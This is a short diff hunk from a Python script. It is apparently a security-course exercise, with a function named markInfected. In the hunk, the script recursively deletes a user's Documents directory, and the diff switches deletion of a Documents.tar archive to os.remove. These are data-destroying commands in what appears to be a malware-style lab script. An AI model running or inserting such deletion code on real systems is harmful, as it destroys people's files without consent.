@@ -78,7 +78,7 @@ def markInfected():
 
 	#delete dir
 	shutil.rmtree('/home/cpsc/Documents')
-	shutil.rmtree('/home/cpsc/Documents.tar')
+	os.remove('/home/cpsc/Documents.tar')
 
 
 ###############################################################
